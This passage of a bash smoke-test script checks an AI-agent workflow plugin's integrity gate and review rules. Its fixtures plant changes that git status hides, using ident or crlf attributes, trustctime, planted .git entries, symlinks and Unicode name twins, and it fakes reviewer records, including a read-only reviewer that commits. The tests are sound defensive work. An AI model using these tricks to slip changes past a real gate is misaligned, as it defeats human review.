has "no-setpriv" "$ZZ" || has "cannot be listed" "$ZZ" || fail "the gate missed an untracked directory this user cannot list: $ZZ"
chmod 755 "$SM/zz"; rm -rf "$SM/zz"; echo x >"$SM/empty/conftest.py"; chmod 311 "$SM/empty"
ZZ="$(asuser bash -c 'source "$1/_lib.sh"; apex_dirty "$2"' _ "$EX" "$SM")"
has "no-setpriv" "$ZZ" || has "cannot be listed" "$ZZ" || fail "the gate missed a submodule directory this user cannot list: $ZZ"
chmod 755 "$SM/empty"; rm -f "$SM/empty/conftest.py"
has "no-setpriv" "$ZZ" && echo "smoke note: running as root without setpriv — the unlistable-directory checks were skipped"
# A '.git' entry below the top hides its directory's files from git, and git
# commands run there answer from it.
mkdir -p "$SM/lib"; echo l >"$SM/lib/l.txt"; git -C "$SM" add lib; git -C "$SM" commit -qm lib >/dev/null 2>&1
[ -z "$(source "$EX/_lib.sh"; apex_dirty "$SM")" ] || fail "a clean repository with a tracked directory was reported dirty: $(source "$EX/_lib.sh"; apex_dirty "$SM")"
git init -q "$SM/lib"
has "lib/.git (a .git entry)" "$(source "$EX/_lib.sh"; apex_dirty "$SM")" || fail "the gate missed a repository planted in a tracked directory"
rm -rf "$SM/lib/.git"; mkdir -p "$SM/lib/.git"; echo x >"$SM/lib/.git/conftest.py"
has "lib/.git (a .git entry)" "$(source "$EX/_lib.sh"; apex_dirty "$SM")" || fail "the gate missed files in a directory named .git"
rm -rf "$SM/lib/.git"; echo 'gitdir: /nonexistent' >"$SM/lib/.Git"
has "lib/.Git (a .git entry)" "$(source "$EX/_lib.sh"; apex_dirty "$SM")" || fail "the gate missed a .git file below the top"
rm -f "$SM/lib/.Git"
# On a case-insensitive filesystem $SM/.GIT is $SM/.git, the fixture's own git
# dir: writing there and then rm -rf would destroy the repository. The probe
# runs in a scratch directory; where it is insensitive the top-level .GIT
# assertion is skipped (printed), and the rm -rf never runs.
CIPROBE="$SMOKE_TMP/ci-probe"; mkdir -p "$CIPROBE"; : >"$CIPROBE/probe-lower"
if [ -e "$CIPROBE/PROBE-LOWER" ]; then
  echo "smoke SKIP: case-insensitive filesystem ($CIPROBE): \$SM/.GIT aliases the fixture's .git, so the top-level .GIT assertion is not run here (it still runs on case-sensitive filesystems)"
else
  mkdir -p "$SM/.GIT"; echo x >"$SM/.GIT/conftest.py"
  has ".GIT (a .git entry)" "$(source "$EX/_lib.sh"; apex_dirty "$SM")" || fail "the gate missed a top-level directory named .GIT"
  rm -rf "$SM/.GIT"
fi
# Run state never lives in a linked worktree: a .dev-plan-state there is checked.
git -C "$SM" worktree add -q "$SMOKE_TMP/smwt" 2>/dev/null
[ -z "$(source "$EX/_lib.sh"; apex_dirty "$SMOKE_TMP/smwt")" ] || fail "a clean linked worktree with submodules was reported dirty: $(source "$EX/_lib.sh"; apex_dirty "$SMOKE_TMP/smwt")"
mkdir -p "$SMOKE_TMP/smwt/.dev-plan-state"; echo x >"$SMOKE_TMP/smwt/.dev-plan-state/conftest.py"
has ".dev-plan-state" "$(source "$EX/_lib.sh"; apex_dirty "$SMOKE_TMP/smwt")" || fail "the gate missed files in a .dev-plan-state directory inside a linked worktree"
rm -rf "$SMOKE_TMP/smwt/.dev-plan-state"
# A worktree whose .git file is swapped for a copy of its git dir is still a
# worktree: its .dev-plan-state is checked.
WG="$(git -C "$SMOKE_TMP/smwt" rev-parse --absolute-git-dir)"; rm -f "$SMOKE_TMP/smwt/.git"; cp -a "$WG" "$SMOKE_TMP/smwt/.git"
git -C "$SM" rev-parse --absolute-git-dir >"$SMOKE_TMP/smwt/.git/commondir"
mkdir -p "$SMOKE_TMP/smwt/.dev-plan-state"; echo x >"$SMOKE_TMP/smwt/.dev-plan-state/conftest.py"
has ".dev-plan-state/conftest.py" "$(source "$EX/_lib.sh"; apex_dirty "$SMOKE_TMP/smwt")" || fail "the gate missed .dev-plan-state in a worktree whose .git is a directory"
rm -rf "$SMOKE_TMP/smwt/.dev-plan-state"
# An untracked symlink (pytest follows it) is not in the head.
mkdir -p "$SMOKE_TMP/smext"; echo x >"$SMOKE_TMP/smext/conftest.py"; ln -s "$SMOKE_TMP/smext" "$SM/lib/ext"
has "lib/ext" "$(source "$EX/_lib.sh"; apex_dirty "$SM")" || fail "the gate missed an untracked symlink to a directory"
rm -f "$SM/lib/ext"
# A run without a worktree keeps its state in the checkout: unless committed
# rules ignore .dev-plan-state, the gate cannot show the tree is the head.
NW="$SMOKE_TMP/nw"; mkdir -p "$NW/plans"; git init -q -b main "$NW"; printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$NW/plans/n-plan.md"
git -C "$NW" add -A; git -C "$NW" commit -qm n; ( cd "$NW" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/n-plan.md >/dev/null 2>&1 ) || true
has ".dev-plan-state" "$(source "$EX/_lib.sh"; apex_dirty "$NW")" || fail "a run without a worktree passed with its state directory not ignored"
printf '.dev-plan-state/\n' >"$NW/.gitignore"; git -C "$NW" add .gitignore; git -C "$NW" commit -qm ignore-state
[ -z "$(source "$EX/_lib.sh"; apex_dirty "$NW")" ] || fail "a run without a worktree whose state is ignored was reported dirty: $(source "$EX/_lib.sh"; apex_dirty "$NW")"
# Names are bytes: an NFC twin of a tracked NFD directory is not in the head,
# and an NFD directory is not ignored by an NFC rule.
UN="$SMOKE_TMP/un"; mkdir -p "$UN/$(printf 'cafe\xcc\x81')"; git init -q -b main "$UN"; echo t >"$UN/$(printf 'cafe\xcc\x81')/t.py"; : >"$UN/$(printf 'cafe\xcc\x81')/conftest.py"
printf '/n\xc3\xa9/\n' >"$UN/.gitignore"; git -C "$UN" add -A; git -C "$UN" commit -qm u
mkdir -p "$UN/$(printf 'caf\xc3\xa9')"; echo x >"$UN/$(printf 'caf\xc3\xa9')/conftest.py"
has "conftest.py" "$(source "$EX/_lib.sh"; apex_dirty "$UN")" || fail "the gate missed an NFC twin of a tracked NFD directory"
mkdir -p "$UN/$(printf 'ne\xcc\x81')"; echo x >"$UN/$(printf 'ne\xcc\x81')/c.py"
has "c.py" "$(source "$EX/_lib.sh"; apex_dirty "$UN")" || fail "an NFD directory was taken as ignored by an NFC rule"
# Many entries in one directory are answered without stalling.
BG="$SMOKE_TMP/bg"; mkdir -p "$BG/data"; git init -q -b main "$BG"; printf '*.log\n' >"$BG/.gitignore"; echo k >"$BG/data/keep"; git -C "$BG" add -A; git -C "$BG" commit -qm b
python3 -c 'import sys
for i in range(12000): open("%s/data/f%06d%s.log" % (sys.argv[1], i, "x" * 60), "w").close()' "$BG"
[ -z "$(source "$EX/_lib.sh"; timeout 120 bash -c 'source "$1/_lib.sh"; apex_dirty "$2"' _ "$EX" "$BG" || echo stalled)" ] || fail "the inventory stalled or misreported a directory with 12000 ignored files"
# Attributes that convert bytes (ident) make git status vouch for other bytes
# of the same size: those files are compared with what a checkout writes.
ID="$SMOKE_TMP/id"; mkdir -p "$ID"; git init -q -b main "$ID"; printf 'v.py ident\n' >"$ID/.gitattributes"
printf 'v = "$Id$"\nprint("head")\n' >"$ID/v.py"; git -C "$ID" add -A; git -C "$ID" commit -qm i; git -C "$ID" worktree add -q "$SMOKE_TMP/idwt" 2>/dev/null
[ -z "$(source "$EX/_lib.sh"; apex_dirty "$SMOKE_TMP/idwt")" ] || fail "a clean worktree with an ident file was reported dirty: $(source "$EX/_lib.sh"; apex_dirty "$SMOKE_TMP/idwt")"
python3 -c 'import sys
p = sys.argv[1]; b = open(p, "rb").read(); first, rest = b.split(b"\n", 1)
new = b"v = \"$Id: \"; print(\"NOT HEAD\"); x = \""
open(p, "wb").write(new + b" " * (len(first) - len(new) - 1) + b"$\n" + rest)' "$SMOKE_TMP/idwt/v.py"
has "v.py (differs from the head)" "$(source "$EX/_lib.sh"; apex_dirty "$SMOKE_TMP/idwt")" || fail "the gate missed same-size bytes that git status cleans to the head (ident)"
# Every tracked file is compared, not a list of converting attributes: the
# legacy crlf attribute cleans CRLF away, and git add refreshes the stat.
CR="$SMOKE_TMP/cr"; mkdir -p "$CR"; git init -q -b main "$CR"; printf 'gate.sh crlf=input\n' >"$CR/.gitattributes"
printf 'fail=1\nif [ "$fail" = 1 ]; then exit 1; fi\n' >"$CR/gate.sh"; git -C "$CR" add -A; git -C "$CR" commit -qm c
[ -z "$(source "$EX/_lib.sh"; apex_dirty "$CR")" ] || fail "a clean repository with a crlf attribute was reported dirty"
printf 'fail=1\r\nif [ "$fail" = 1 ]; then exit 1; fi\n' >"$CR/gate.sh"; git -C "$CR" add gate.sh
[ -z "$(git -C "$CR" status --porcelain)" ] || fail "the crlf fixture is not hidden from git status (fixture broken)"
has "gate.sh (differs from the head)" "$(source "$EX/_lib.sh"; apex_dirty "$CR")" || fail "the gate missed CRLF bytes a crlf attribute hides from git status"
# What "a checkout of the head" writes comes from the head's attributes: an
# ignored, untracked .gitattributes cannot redefine it.
GA="$SMOKE_TMP/ga"; mkdir -p "$GA"; git init -q -b main "$GA"; printf '.*\n!/.gitignore\n' >"$GA/.gitignore"; printf 'a\nb\n' >"$GA/data.txt"
git -C "$GA" add -A; git -C "$GA" commit -qm g; printf 'data.txt eol=crlf\n' >"$GA/.gitattributes"; rm -f "$GA/data.txt"; git -C "$GA" checkout -- data.txt; git -C "$GA" add data.txt
[ -z "$(git -C "$GA" status --porcelain)" ] || fail "the ignored-.gitattributes fixture is not hidden from git status (fixture broken)"
has "data.txt (differs from the head)" "$(source "$EX/_lib.sh"; apex_dirty "$GA")" || fail "an ignored .gitattributes redefined what a checkout of the head writes"
# An untracked directory is not in the head even when it is empty.
mkdir -p "$GA/reports"; has "reports/ (an untracked directory)" "$(source "$EX/_lib.sh"; apex_dirty "$GA")" || fail "the gate missed an empty untracked directory"
rm -f "$GW/extra.txt"; echo BADD >"$GW/impl.txt"; git -C "$GW" commit -qam badd; git -C "$GW" config core.trustctime false
touch -r "$GW/impl.txt" "$SMOKE_TMP/g1.ref"; echo GOOD >"$GW/impl.txt"; touch -r "$SMOKE_TMP/g1.ref" "$GW/impl.txt"
has "GATE: FAIL" "$(cd "$G1" && "$EX/green-gate.sh" plans/g-plan.md check 2>&1)" || fail "the gate passed a same-size edit hidden by core.trustctime=false"
ok "land builds the reviewed tree (no -s ours revert, overlaps refused until refork, no merge drivers, submodules seen); refork resets reviews and G12; land re-runs finish; the gate binds to a clean head (submodules included) and allows ignored tool caches"

# 42. Portability (ADR-0003): version 0.7.0, ADR-0003 and ADR-0004 present, reviewer cannot
#     edit, ruflo optional (no required ruflo/claude-flow reference outside
#     docs/legacy/), apex-plan template profiles.
grep -q '"version": "0.7.0"' "$PLUGIN_ROOT/.claude-plugin/plugin.json" || fail "plugin.json is not version 0.7.0"
ADR4="$PLUGIN_ROOT/docs/adrs/0004-review-loop-calibration.md"
[ -f "$ADR4" ] && grep -qE "^- \*\*Status:\*\* Accepted" "$ADR4" && grep -q '^## What this loosens and why it is safe' "$ADR4" || fail "ADR-0004 missing, not Accepted, or without its loosening section"
ADR3="$PLUGIN_ROOT/docs/adrs/0003-portability-and-dispatch-consumer.md"
[ -f "$ADR3" ] && grep -qE "^- \*\*Status:\*\* (Proposed|Accepted)" "$ADR3" || fail "ADR-0003 missing or without a Status"
grep -qE "^disallowedTools:.*Edit.*Write.*NotebookEdit" "$GR" || fail "gibson-reviewer does not disallow Edit/Write/NotebookEdit"
MARKET_ROOT="$(cd "$PLUGIN_ROOT/../.." && pwd)"
RUFLO_HITS="$(grep -rIn -i 'ruflo\|claude-flow\|hooks_route\|swarm_init' "$PLUGIN_ROOT" "$MARKET_ROOT/plugins/apex-project-start" "$MARKET_ROOT/README.md" 2>/dev/null \
  | grep -v '/docs/legacy/' | grep -v '/scripts/smoke.sh:' | grep -iv 'optional\|APEX_MEMORY_CMD' || true)"
[ -z "$RUFLO_HITS" ] || fail "ruflo/claude-flow referenced as required outside docs/legacy/: $(printf '%s' "$RUFLO_HITS" | head -3)"
for prof in generic apex; do for t in adr-template.md plan-template.md; do
  [ -f "$PLUGIN_ROOT/skills/apex-plan/resources/templates/profiles/$prof/$t" ] || fail "apex-plan profile $prof lacks $t"
done; done
! grep -qi 'getapexinsights\|apex-app' "$PLUGIN_ROOT"/skills/apex-plan/resources/templates/profiles/generic/*.md || fail "the generic apex-plan profile carries Apex-specific vocabulary"
ok "portability: version 0.7.0, ADR-0003, ADR-0004, read-only reviewer edits, ruflo optional, apex-plan profiles"

# 43. apex-dispatch Phase 3.2 consumers: green-gate.sh check PASS moves the ACTIVE
#     lock BUILD -> GATE (only from BUILD; a FAIL leaves it); checkpoint.sh review
#     refuses a record the transcript audit refused and takes the provider from the
#     record; in provenance mode complete enforces the review shape (six distinct
#     lens approvals + adversarial for fanout6+adversarial) and reviewer family
#     diversity, degrading to a ledgered warning when doctor.json shows no second family.
P3="$SMOKE_TMP/p32"; mkdir -p "$P3/plans"; git init -q -b main "$P3"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$P3/plans/c-plan.md"; git -C "$P3" add -A; git -C "$P3" commit -qm p
( cd "$P3" && APEX_GIBSON=0 "$EX/init.sh" plans/c-plan.md >/dev/null 2>&1 ) || fail "init for the Phase 3.2 checks failed"
P3S="$(st "$P3" plans/c-plan.md)"; P3W="$P3S/worktree"; P3O="$(dirname "$P3S")/ACTIVE/owner.json"
p3sha() { git -C "$P3W" rev-parse HEAD; }
p3stage() { python3 -c 'import json, sys; o = json.load(open(sys.argv[1])); print(o["stage"]) if len(sys.argv) == 2 else (o.update(stage=sys.argv[2]), json.dump(o, open(sys.argv[1], "w")))' "$P3O" "$@"; }
( cd "$P3" && source "$EX/_lib.sh" && apex_resolve plans/c-plan.md && apex_lock_acquire "$PLAN_HASH" "$PLAN_ABS" 1 BUILD ) || fail "could not take the ACTIVE lock"
echo b >"$P3W/b.md"; git -C "$P3W" add -A; git -C "$P3W" commit -qm b
has "GATE: FAIL" "$(cd "$P3" && APEX_GATE_TEST=false "$EX/green-gate.sh" plans/c-plan.md check 2>&1)" && [ "$(p3stage)" = BUILD ] || fail "a failing gate moved the stage off BUILD"
(cd "$P3" && APEX_GATE_TEST=true "$EX/green-gate.sh" plans/c-plan.md check >/dev/null 2>&1) && [ "$(p3stage)" = GATE ] || fail "a passing gate did not move the stage BUILD -> GATE"
for s in REVIEW DONE; do
  p3stage "$s"; (cd "$P3" && APEX_GATE_TEST=true "$EX/green-gate.sh" plans/c-plan.md check >/dev/null 2>&1); [ "$(p3stage)" = "$s" ] || fail "a passing gate moved the stage off $s"
done
p3stage BUILD
mkdir -p "$P3S/dispatch/reviews-raw"
raw() {  # raw ID ROLE [VERDICT] [PROVIDER]
  python3 -c 'import json, sys
i, role, verdict, prov, head = sys.argv[2:7]
json.dump({"record_id": "rec-" + i + "-0001", "line": 1, "head_sha": head, "sha": head, "role": role, "verdict": verdict,
           "provider": prov, "family": "anthropic" if prov == "claude-session" else "x"}, open(sys.argv[1], "w"))' \
    "$P3S/dispatch/reviews-raw/$1.json" "$1" "$2" "${3:-APPROVE}" "${4:-claude-session}" "$(p3sha)"
}
printf '{"agent_id": "bad1", "refused": "read-only role reviewer (agent bad1) changed the repository: Bash git commit"}' >"$P3S/dispatch/reviews-raw/bad1.json"
expect_refusal "a record refused by the transcript audit" "refused by apex-dispatch's transcript audit" indir "$P3" "$CP" plans/c-plan.md review 1 "$(p3sha)" APPROVE rv --agent-id bad1
raw l1 lens:correctness
(cd "$P3" && "$CP" plans/c-plan.md review 1 "$(p3sha)" APPROVE rv --agent-id l1 --provider codex >/dev/null) || fail "a lens record was refused"
python3 -c 'import json,sys; r=json.load(open(sys.argv[1]))["reviews"]["1"]["records"][-1]; assert r["provider"]=="claude-session" and r["role"]=="lens:correctness", r' "$P3S/checkpoint.json" \
  || fail "the review record took the caller's --provider instead of the record's"
for l in security consent-pii money performance; do i="l$(printf '%s' "$l" | tr -dc a-z)"; raw "$i" "lens:$l"; (cd "$P3" && "$CP" plans/c-plan.md review 1 "$(p3sha)" APPROVE rv --agent-id "$i" >/dev/null) || fail "lens $l refused"; done
raw adv adversarial; (cd "$P3" && "$CP" plans/c-plan.md review 1 "$(p3sha)" APPROVE rv --agent-id adv >/dev/null) || fail "the adversarial record was refused"
python3 - "$P3S/checkpoint.json" "$(p3sha)" <<'PY'
import json, sys
p, h = sys.argv[1:]; s = json.load(open(p)); s.setdefault("tiers", {})["1"] = {"tier": "C", "head": h}; json.dump(s, open(p, "w"))
PY
(cd "$P3" && "$CP" plans/c-plan.md approve 1 "$(p3sha)" "approve G12 1" >/dev/null)
mkdir -p "$SMOKE_TMP/fd43/scripts"; printf '#!/bin/sh\nexit 0\n' >"$SMOKE_TMP/fd43/scripts/route.sh"
printf '#!/bin/sh\necho "$*" >>"$(dirname "$0")/calls.log"\nexit 0\n' >"$SMOKE_TMP/fd43/scripts/ledger.sh"; chmod +x "$SMOKE_TMP/fd43/scripts/"*.sh
expect_refusal "Tier C with five lenses" "six distinct lens approvals" indir "$P3" APEX_DISPATCH_ROOT="$SMOKE_TMP/fd43" "$CP" plans/c-plan.md complete 1 ok
# A typed (declared) record never counts toward the lenses in provenance mode.
python3 - "$P3S/checkpoint.json" "$(p3sha)" <<'PY'
import json, sys
p, h = sys.argv[1:]; s = json.load(open(p))
s["reviews"]["1"]["records"].append({"attempt": s["reviews"]["1"].get("attempt", 1), "epoch": s.get("epoch", 0), "sha": h,
    "verdict": "APPROVE", "role": "lens:maintainability", "provenance": "declared", "source": ""})
json.dump(s, open(p, "w"))
PY
expect_refusal "a declared lens record counted in provenance mode" "six distinct lens approvals" indir "$P3" APEX_DISPATCH_ROOT="$SMOKE_TMP/fd43" "$CP" plans/c-plan.md complete 1 ok
raw lm lens:maintainability; (cd "$P3" && "$CP" plans/c-plan.md review 1 "$(p3sha)" APPROVE rv --agent-id lm >/dev/null) || fail "the sixth lens record was refused"
# The shared second-family rule needs apex-dispatch's ledger.py beside the fake root.
mkdir -p "$SMOKE_TMP/fd43/scripts/lib" "$SMOKE_TMP/fd43/resources"; cp "$MARKET_ROOT/plugins/apex-dispatch/scripts/lib/ledger.py" "$SMOKE_TMP/fd43/scripts/lib/"
# A non-approving review at this head is final: neither an unrecorded raw record nor a ledger verdict row can be discarded.
raw rsec2 lens:security REQUEST_CHANGES
expect_refusal "an unrecorded REQUEST_CHANGES raw record at HEAD" "did not approve" indir "$P3" APEX_DISPATCH_ROOT="$SMOKE_TMP/fd43" "$CP" plans/c-plan.md complete 1 ok
rm -f "$P3S/dispatch/reviews-raw/rsec2.json"
raw unp1 reviewer UNPARSED
expect_refusal "an UNPARSED (unreadable verdict) raw record at HEAD" "did not approve" indir "$P3" APEX_DISPATCH_ROOT="$SMOKE_TMP/fd43" "$CP" plans/c-plan.md complete 1 ok
rm -f "$P3S/dispatch/reviews-raw/unp1.json"
raw stl1 lens:security; python3 -c 'import json,sys; r=json.load(open(sys.argv[1])); r["stale"]="HEAD moved"; json.dump(r, open(sys.argv[1], "w"))' "$P3S/dispatch/reviews-raw/stl1.json"
expect_refusal "a stale raw record" "is stale" indir "$P3" "$CP" plans/c-plan.md review 1 "$(p3sha)" APPROVE rv --agent-id stl1
printf '{"event": "verdict", "source": "hook", "line": 1, "head_sha": "%s", "verdict": "REQUEST_CHANGES", "agent_id": "gone", "seq": 0}\n' "$(p3sha)" >"$P3S/dispatch/ledger.jsonl"
expect_refusal "a REQUEST_CHANGES verdict row at HEAD" "did not approve" indir "$P3" APEX_DISPATCH_ROOT="$SMOKE_TMP/fd43" "$CP" plans/c-plan.md complete 1 ok
printf '{"agent_id": "bad2", "refused": "audit", "head_sha": "%s", "line": 1}' "$(p3sha)" >"$P3S/dispatch/reviews-raw/bad2.json"
rm -f "$P3S/dispatch/ledger.jsonl"
expect_refusal "an audit-refused record at HEAD" "refused by the transcript audit" indir "$P3" APEX_DISPATCH_ROOT="$SMOKE_TMP/fd43" "$CP" plans/c-plan.md complete 1 ok
# Only a new commit (and fresh reviews of it) supersedes them.
echo c >"$P3W/c.md"; git -C "$P3W" add -A; git -C "$P3W" commit -qm c; p3stage BUILD
(cd "$P3" && APEX_GATE_TEST=true "$EX/green-gate.sh" plans/c-plan.md check >/dev/null 2>&1) || fail "the gate failed on the new head"
python3 - "$P3S/checkpoint.json" "$(p3sha)" <<'PY'
import json, sys
p, h = sys.argv[1:]; s = json.load(open(p)); s.setdefault("tiers", {})["1"] = {"tier": "C", "head": h}; json.dump(s, open(p, "w"))
PY
(cd "$P3" && "$CP" plans/c-plan.md approve 1 "$(p3sha)" "approve G12 1" >/dev/null)
for l in correctness security consent-pii money performance maintainability; do
  i="n$(printf '%s' "$l" | tr -dc a-z)"; raw "$i" "lens:$l"; (cd "$P3" && "$CP" plans/c-plan.md review 1 "$(p3sha)" APPROVE rv --agent-id "$i" >/dev/null) || fail "new-head lens $l refused"
done
raw nadv adversarial; (cd "$P3" && "$CP" plans/c-plan.md review 1 "$(p3sha)" APPROVE rv --agent-id nadv >/dev/null) || fail "new-head adversarial refused"
# Diversity: a second family counts only when doctor shows it available (and, since apex-dispatch 0.3.0,
# verified, allowed to review and allowed the route's class) AND its bin/worker-*.sh shim ships.
printf '{"claude_p_auth": "available", "providers": {"claude-p": {"enabled": true, "available": true, "verified": true, "roles_allowed": ["reviewer"], "allowed_classes": ["security"]}}}' >"$P3S/dispatch/doctor.json"
mkdir -p "$SMOKE_TMP/fd43/bin"; printf '#!/bin/sh\nexit 0\n' >"$SMOKE_TMP/fd43/bin/worker-claude-p.sh"; chmod +x "$SMOKE_TMP/fd43/bin/worker-claude-p.sh"
expect_refusal "Tier C without a second family while its shim ships" "family diversity (block)" indir "$P3" APEX_DISPATCH_ROOT="$SMOKE_TMP/fd43" "$CP" plans/c-plan.md complete 1 ok
rm -f "$SMOKE_TMP/fd43/bin/worker-claude-p.sh"
OUT="$(cd "$P3" && APEX_DISPATCH_ROOT="$SMOKE_TMP/fd43" "$CP" plans/c-plan.md complete 1 ok 2>&1)" || fail "Tier C with no shipped second-family shim did not complete: $OUT"
has 'warning: reviewer family diversity (block)' "$OUT" && grep -q '^evidence ' "$SMOKE_TMP/fd43/scripts/calls.log" \
  && grep -q '^append hook_advisory .*family diversity.* --source cli' "$SMOKE_TMP/fd43/scripts/calls.log" || fail "the diversity degrade was not warned and ledgered, or evidence was not asked"
[ "$(p3stage)" = DONE ] || fail "complete did not move the stage to DONE"
ok "Phase 3.2: green-gate PASS = BUILD -> GATE (only from BUILD); refused raw records refused; provider from the record; provenance complete needs six canonical lenses + adversarial (declared records do not count), refuses any non-approving or unreadable (UNPARSED) review at HEAD until a new commit, refuses stale records, and needs family diversity only when a second family has a shipped shim (else a ledgered warning); DONE"

# --- ADR-0004: review-loop calibration (checks 44-50) ---------------------------
# cal_run DIR PLAN_TEXT — a fresh repository with plans/v-plan.md, initialised
# (harness on for complete); prints the worktree.
cal_run() {
  mkdir -p "$1/plans"; git init -q -b main "$1"; printf '%b' "$2" >"$1/plans/v-plan.md"
  git -C "$1" add -A; git -C "$1" commit -qm v
  ( cd "$1" && APEX_GIBSON=0 "$EX/init.sh" plans/v-plan.md >/dev/null 2>&1 ) || return 1
  printf '%s\n' "$(st "$1" plans/v-plan.md)/worktree"
}
vc() { local d="$1"; shift; ( cd "$d" && "$CP" plans/v-plan.md "$@" ); }
wcommit() { echo "$2" >>"$1/$3"; git -C "$1" add -A; git -C "$1" commit -qm "$2"; git -C "$1" rev-parse HEAD; }
TWO='- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n- [ ] **Phase 1.2** [docs] b\n  - Acceptance: true\n'

# 44. Threat model before review: the brief prints a THREAT_MODEL block from the
#     task's Threat: directive, else the plan's "## Threat model" section (author
#     notes in blockquotes left out), else the default; templates, the reviewer
#     agents and iterate.md carry it.
T44="$SMOKE_TMP/t44"; TW="$(cal_run "$T44" '# T\n\n## Threat model\n\nOnly accidents by the trusted agent.\n> author note, not for reviewers\n\n## Tasks\n\n- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n  - Threat: task-level model\n- [ ] **Phase 1.2** [docs] b\n  - Acceptance: true\n')" || fail "init for check 44 failed"
B44="$(brief "$T44" plans/v-plan.md)"
has '^THREAT_MODEL: source task$' "$B44" && has '^  > task-level model$' "$B44" || fail "the brief did not print the task's Threat: directive as THREAT_MODEL"
O44="$(python3 "$EX/planlib.py" threat "$T44/plans/v-plan.md" 13)"
has '^SOURCE: plan$' "$O44" && has '^Only accidents by the trusted agent.$' "$O44" && ! has 'author note' "$O44" || fail "the plan's Threat model section was not used (or kept author notes): $O44"
printf -- "$TWO" >"$SMOKE_TMP/t44-noth.md"
has '^SOURCE: default$' "$(python3 "$EX/planlib.py" threat "$SMOKE_TMP/t44-noth.md" 1)" && has 'deliberate tampering with state, config or the harness' "$(python3 "$EX/planlib.py" threat "$SMOKE_TMP/t44-noth.md" 1)" \
  || fail "a plan without a threat model did not get the default"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  - Threat: x\n  - Threat: y\n' >"$SMOKE_TMP/t44-dup.md"
has 'Threat: given more than once' "$(python3 "$EX/planlib.py" validate "$SMOKE_TMP/t44-dup.md" 2>&1 || true)" || fail "a repeated Threat: directive was not refused"
for prof in generic apex; do
  TP="$PLUGIN_ROOT/skills/apex-plan/resources/templates/profiles/$prof/plan-template.md"
  grep -q '^## Threat model$' "$TP" && grep -q 'Threat: {one line}' "$TP" && has '^SOURCE: plan$' "$(python3 "$EX/planlib.py" threat "$TP")" || fail "the $prof plan template lacks the Threat model section or the Threat: directive"
done
for f in "$GR" "$PLUGIN_ROOT/commands/iterate.md" "$MARKET_ROOT/plugins/apex-dispatch/agents/reviewer.md" "$MARKET_ROOT/plugins/apex-dispatch/agents/adversarial-reviewer.md"; do
  grep -q 'THREAT_MODEL' "$f" && grep -q 'BUDGET' "$f" || fail "$(basename "$f") does not pass the threat model and budget to reviewers"
done
grep -q 'verbatim' "$PLUGIN_ROOT/commands/iterate.md" && grep -q '^## Severity bar' "$GR" && grep -q 'MODE' "$GR" || fail "iterate.md / gibson-reviewer lack the verbatim threat model, severity bar or MODE input"
ok "threat model: task directive > plan section > default in the brief; templates and reviewer prompts carry it with the severity bar"

# 45. Diff-scoped re-reviews: LAST_REVIEWED / REVIEW_ROUND / REVIEW_MODE from the
#     current attempt's reviews; ADVERSARY_BUDGET from APEX_ADVERSARY_BUDGET.
T45="$SMOKE_TMP/t45"; TW="$(cal_run "$T45" "$TWO")" || fail "init for check 45 failed"
B45="$(brief "$T45" plans/v-plan.md)"
has '^LAST_REVIEWED: none$' "$B45" && has '^REVIEW_ROUND: 1$' "$B45" && has '^REVIEW_MODE: full$' "$B45" && has '^ADVERSARY_BUDGET: 3$' "$B45" \
  || fail "a fresh task's brief is not round 1 / full / budget 3"
has '^ADVERSARY_BUDGET: 5$' "$( (cd "$T45" && APEX_ADVERSARY_BUDGET=5 "$EX/iterate.sh" plans/v-plan.md) 2>&1)" || fail "APEX_ADVERSARY_BUDGET was not surfaced"
has '^ADVERSARY_BUDGET: 3$' "$( (cd "$T45" && APEX_ADVERSARY_BUDGET=lots "$EX/iterate.sh" plans/v-plan.md) 2>&1)" || fail "an invalid APEX_ADVERSARY_BUDGET was not replaced by the default"
S1="$(wcommit "$TW" r1 a.md)"; vc "$T45" review 1 "$S1" REQUEST_CHANGES >/dev/null
B45="$(brief "$T45" plans/v-plan.md)"
has "^LAST_REVIEWED: $S1$" "$B45" && has '^REVIEW_ROUND: 2$' "$B45" && has '^REVIEW_MODE: verify$' "$B45" || fail "after a REQUEST_CHANGES the brief is not round 2 / verify since the reviewed SHA"
S2="$(wcommit "$TW" r2 a.md)"; vc "$T45" review 1 "$S2" APPROVE --role lens:security >/dev/null
B45="$(brief "$T45" plans/v-plan.md)"
has "^LAST_REVIEWED: $S2$" "$B45" && has '^REVIEW_ROUND: 2$' "$B45" || fail "a head whose reviews are still coming in did not keep its round"
vc "$T45" fail 1 "retry" >/dev/null
B45="$(brief "$T45" plans/v-plan.md)"
has '^LAST_REVIEWED: none$' "$B45" && has '^REVIEW_ROUND: 1$' "$B45" && has '^REVIEW_MODE: full$' "$B45" || fail "a new attempt did not start with a full round 1"
grep -q 'REVIEW_MODE\|MODE: verify' "$PLUGIN_ROOT/commands/iterate.md" && grep -q 'PRIOR_FINDINGS' "$PLUGIN_ROOT/commands/iterate.md" && grep -q 'PRIOR_FINDINGS' "$GR" || fail "iterate.md / the reviewer do not document verify-only rounds"
ok "re-reviews: LAST_REVIEWED, REVIEW_ROUND and REVIEW_MODE per attempt; ADVERSARY_BUDGET in the brief"

# 46. Earlier escalation: ASK_HUMAN after REQUEST_CHANGES in APEX_ASK_HUMAN_AFTER
#     (default 2) rounds of the current attempt, not before.
T46="$SMOKE_TMP/t46"; TW="$(cal_run "$T46" "$TWO")" || fail "init for check 46 failed"
S1="$(wcommit "$TW" a1 a.md)"; ! has '^ASK_HUMAN:' "$(vc "$T46" review 1 "$S1" REQUEST_CHANGES 2>&1)" || fail "ASK_HUMAN after one round"
S2="$(wcommit "$TW" a2 a.md)"; ! has '^ASK_HUMAN:' "$(cd "$T46" && APEX_ASK_HUMAN_AFTER=3 "$CP" plans/v-plan.md review 1 "$S2" REQUEST_CHANGES lens-x --role lens:money 2>&1)" || fail "ASK_HUMAN before APEX_ASK_HUMAN_AFTER rounds"
O46="$(vc "$T46" review 1 "$S2" REQUEST_CHANGES 2>&1)"
has "^ASK_HUMAN: line 1 has REQUEST_CHANGES in 2 review rounds" "$O46" && has "waive 1 $S2" "$O46" || fail "no ASK_HUMAN after REQUEST_CHANGES in 2 rounds: $O46"
